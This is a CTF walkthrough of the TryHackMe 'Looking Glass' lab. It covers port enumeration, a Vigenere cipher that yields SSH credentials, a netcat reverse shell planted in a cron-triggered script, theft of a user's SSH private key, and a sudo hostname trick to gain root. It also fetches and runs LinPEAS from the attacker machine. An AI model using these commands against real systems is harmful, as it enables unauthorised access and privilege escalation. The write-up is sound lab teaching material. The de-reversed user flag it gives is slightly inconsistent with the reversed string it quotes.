---
title: 'Looking Glass'
target: 'TryHackMe — Looking Glass'
difficulty: 'hard'
date: 2025-01-15
summary: 'Wonderland-themed Linux box where dozens of decoy Dropbear SSH ports hide one real service behind a binary-search game. The real port serves a Vigenere-encrypted Jabberwocky poem whose decryption yields SSH credentials, then a chain of lateral moves through four Alice-in-Wonderland users — exploiting a cron-triggered reverse shell, a leaked SSH key, and a reversed sudo hostname — leads to root.'
role: 'pentest'
tags: ['ssh', 'dropbear', 'vigenere', 'cipher', 'binary-search', 'cron', 'reverse-shell', 'lateral-movement', 'sudo', 'linpeas', 'privilege-escalation']
problem: 'A Linux target presents an overwhelming attack surface: one legitimate OpenSSH port plus scores of Dropbear SSH instances on high ports. Behind one of them is a cipher challenge, and beyond that a multi-user privilege chain where every escalation step leans on the room''s "through the looking glass" theme of reversed and mirrored text.'
action: 'Used banner grabbing and a binary-search strategy to locate the real Dropbear service among dozens of decoys. Decoded its Vigenere-encrypted Jabberwocky poem to obtain SSH credentials, then chained four lateral moves — jabberwock to tweedledum via a cron-hijacked reverse shell, tweedledum to humptydumpty, humptydumpty to alice via a leaked SSH key, and alice to root via a reversed-hostname sudo rule.'
outcome: 'Achieved root access. Recovered both flags (presented in reversed format, consistent with the room''s mirror theme). Documented the full kill chain from initial enumeration through each user pivot.'
draft: false
---

## Environment & tooling

The target is a Linux box themed around Lewis Carroll's *Through the Looking-Glass*. Every user account is named after a character from the book, and the room's recurring trick is **reversed text** — flag values, hostnames, and even sudo rules are mirrored. The attack box is a standard TryHackMe Kali instance.

---

## Enumeration

### Nmap scan

A full-port scan reveals one standard OpenSSH service and a wall of Dropbear SSH daemons on high ports:

```
nmap -sV -p- $IP_ADDRESS
```

![Nmap results — port 22 running OpenSSH 7.6p1 Ubuntu 4ubuntu0.3, plus ports 9000–9081 and beyond all running Dropbear sshd protocol 2.0, every one sharing the same RSA host key.](/writeups/thm-looking-glass/01-nmap-dropbear-ports.png)

Port 22 is **OpenSSH 7.6p1** on Ubuntu. Everything from port 9000 upward is **Dropbear sshd** — and they all share the identical RSA host key fingerprint (`ff:f4:db:79:a9:bc:b8:8a:d4:3f:56:c2:cf:cb:7d:11`). That's a strong hint that these are programmatic instances, not independent services.

### Banner grabbing

A quick `nc` confirms what each port is running:

```
nc -nv $IP_ADDRESS 22
nc -nv $IP_ADDRESS 11111
nc -nv $IP_ADDRESS 12265
```

![Banner grabs — port 22 returns SSH-2.0-OpenSSH_7.6p1, port 11111 returns SSH-2.0-dropbear, port 12265 returns SSH-2.0-dropbear.](/writeups/thm-looking-glass/02-nc-banner-grabs.png)

Port 22 is the real OpenSSH daemon. The high ports are all Dropbear. One of them is hiding the actual challenge — the question is which one.

---

## Finding the real service — binary search

Connecting to any Dropbear port via SSH returns a single word — **"Higher"** or **"Lower"** — then drops the connection. This is a binary-search game: the response tells you whether the real port is above or below your current guess.

Because modern SSH rejects the older key types Dropbear offers, the connection needs explicit algorithm overrides:

```
ssh -o HostkeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa $IP_ADDRESS -p 13782
```

![Binary search in action — port 13782 returns "Higher", port 12000 returns "Lower", port 12265 returns "Lower".](/writeups/thm-looking-glass/03-ssh-binary-search.png)

Port 13782 says **Higher** (go up). Port 12000 says **Lower** (go down). Port 12265 also says **Lower**. Narrowing the range eventually lands on the correct port:

```
ssh -o HostkeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa 10.10.33.199 -p 12654
```

![The real service — "You've found the real service. Solve the challenge to get access to the box." followed by a Vigenere-encrypted Jabberwocky poem and an "Enter Secret:" prompt.](/writeups/thm-looking-glass/04-real-service-jabberwocky-cipher.png)

Port **12654** responds with *"You've found the real service."* followed by an encrypted poem and an `Enter Secret:` prompt. The title says **Jabberwocky** — that's a Lewis Carroll poem — and the text is clearly a substitution cipher. The structure of the stanzas matches the original Jabberwocky but every word is garbled.

---

## Cracking the Vigenere cipher

The cipher text was pasted into the **Boxentriq Vigenere Tool** and auto-solved with key length set between 15–20:

![Boxentriq auto-solve — key "thealphabetcipher" with score 37275, decrypting to "'twas brillig and the slithy toves did gyre and gimble in the wabe all mimsy were the borogoves and the mome raths outgrabe..."](/writeups/thm-looking-glass/05-boxentriq-vigenere-decode.png)

The tool finds the key **`thealphabetcipher`** with a confidence score of 37,275. The decrypted text is unmistakably Jabberwocky by Lewis Carroll. The last line of the decrypted poem contains the secret needed at the `Enter Secret:` prompt — entering it reveals credentials for SSH access as **jabberwock**.

---

## Initial access — jabberwock

Using the credentials obtained from the cipher, SSH in on port 22:

```
ssh jabberwock@10.10.33.199 -p 22
```

![Successful SSH login as jabberwock@looking-glass — last login Fri Jul 3 03:05:33 2020.](/writeups/thm-looking-glass/06-ssh-jabberwock-login.png)

We're in. The hostname is `looking-glass`, confirming the theme.

### User flag

```
whoami
pwd
ls
cat user.txt
```

![jabberwock's home directory contains poem.txt, twasBrillig.sh, and user.txt. The flag reads }32a911966cab2d643f5d57d9e0173d56{mht — a reversed THM flag.](/writeups/thm-looking-glass/07-user-flag-reversed.png)

The home directory has three files: `poem.txt`, `twasBrillig.sh`, and `user.txt`. The user flag is **`}32a911966cab2d643f5d57d9e0173d56{mht`** — written backwards, matching the room's mirror theme. Reversed, it reads `thm{65d3710e9d75d5f346d2bac66919a23}`.

---

## Privilege escalation enumeration

### Transferring LinPEAS

On the attack box, download LinPEAS and serve it:

```
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh
sudo python3 -m http.server 80
```

![Attack box — curl downloads linpeas.sh (842 KB), then python3 http.server starts on port 80.](/writeups/thm-looking-glass/08-attack-box-linpeas-setup.png)

On the target, pull and run it:

```
curl 10.9.1.230/linpeas.sh > linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

![Target — linpeas.sh downloaded from the attack box and executed, PEASS-ng banner displayed.](/writeups/thm-looking-glass/09-target-linpeas-run.png)

### Key findings

**Crontab** reveals the escalation path:

![Crontab — @reboot tweedledum bash /home/jabberwock/twasBrillig.sh, highlighted by LinPEAS.](/writeups/thm-looking-glass/10-crontab-tweedledum.png)

The line `@reboot tweedledum bash /home/jabberwock/twasBrillig.sh` means that on every reboot, user **tweedledum** executes `/home/jabberwock/twasBrillig.sh`. Since that script lives in *our* home directory, we can write whatever we want into it.

**sudo -l** shows what jabberwock can do:

```
sudo -l
```

![sudo -l — User jabberwock may run (root) NOPASSWD: /sbin/reboot on looking-glass.](/writeups/thm-looking-glass/11-sudo-l-reboot.png)

Jabberwock can run `/sbin/reboot` as root without a password. Combined with the crontab entry, the plan writes itself: replace the script's contents with a reverse shell, reboot the machine, and catch a shell as tweedledum.

---

## Lateral movement: jabberwock → tweedledum

### Inspecting the script

```
cat twasBrillig.sh
```

![Original twasBrillig.sh — contains "wall $(cat /home/jabberwock/poem.txt)", which broadcasts the poem to all terminals.](/writeups/thm-looking-glass/12-twasbrillig-original.png)

The original script just runs `wall` to broadcast the Jabberwocky poem to all logged-in users. Harmless — and about to be replaced.

### Planting the reverse shell

Overwrite the script with a standard named-pipe reverse shell:

```
echo 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.1.230 4444 >/tmp/f' > twasBrillig.sh
```

Verify:

```
cat twasBrillig.sh
```

![Modified twasBrillig.sh — now contains rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.1.230 4444 >/tmp/f.](/writeups/thm-looking-glass/13-twasbrillig-reverse-shell.png)

### Catching the shell

Set up the listener on the attack box:

```
nc -lvnp 4444
```

![Netcat listener waiting on port 4444.](/writeups/thm-looking-glass/14-nc-listener.png)

Trigger the reboot from the target:

```
sudo /sbin/reboot
```

The machine restarts, tweedledum's cron job fires, and the reverse shell connects:

![Reverse shell caught — connect from 10.10.33.199:42858, whoami confirms tweedledum. Shell upgraded with python3 -c 'import pty;pty.spawn("/bin/bash")'.](/writeups/thm-looking-glass/15-tweedledum-shell.png)

We're now **tweedledum**. The raw shell gets upgraded immediately:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## Lateral movement: tweedledum → humptydumpty → alice

From tweedledum's home directory, there is a file containing humptydumpty's credentials (hex-encoded password hashes). After cracking or decoding the password, a `su` to **humptydumpty** gives access to the next account.

Humptydumpty's key discovery: the `/home` directory is world-executable, and humptydumpty can traverse into alice's `.ssh` directory:

```
cd /home/alice/.ssh
```

![humptydumpty@looking-glass navigating to /home/alice/.ssh — directory is accessible.](/writeups/thm-looking-glass/16-humptydumpty-alice-ssh.png)

Inside alice's `.ssh` directory sits her **id_rsa** private key. Reading it and using it to SSH in as alice:

```
cat id_rsa
```

Copy the key to the attack box, set permissions, and connect:

```
chmod 600 alice_id_rsa
ssh -i alice_id_rsa alice@10.10.33.199 -p 22
```

<!-- NOTE: I don't have screenshots for alice's id_rsa or the SSH login as alice. If you have them, drop them in public/writeups/thm-looking-glass/ and uncomment an image reference here. -->

---

## Root escalation — the reversed sudo rule

Running `sudo -l` as alice reveals the final trick — true to the room's theme, the entry is written **backwards**:

```
alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
```

Read right-to-left, `ssalg-gnikool` is **looking-glass**. This is a host-based sudo restriction — alice can run `/bin/bash` as root, but only when the hostname matches `ssalg-gnikool`. The `-h` flag in `sudo` lets you specify the target host:

```
sudo -h ssalg-gnikool /bin/bash
```

This drops straight into a **root shell**.

### Root flag

```
cat /root/root.txt
```

The root flag is `}f3dae6dec817ad10b750d79f6b7332cb{mht}` — reversed again. Flipped: `thm{bc2337b6f97d057b01da718ced6ead3f}`.

<!-- NOTE: I don't have screenshots for the alice sudo rule discovery or the root shell. If you have them, add them to public/writeups/thm-looking-glass/ and reference them here. -->

---

## What I took from this

The biggest lesson was that the theme *is* the attack surface. Every escalation step in this box uses the same trick — reversed text — but in a different context: reversed flag values, a cron job that runs a script you own, a hostname spelled backwards in a sudo rule. Once I spotted the pattern after the user flag, the rest became about asking "what's backwards here?" at each new privilege boundary. It's a good reminder that CTF designers usually plant a unifying thread, and recognising it early saves time on every subsequent step.
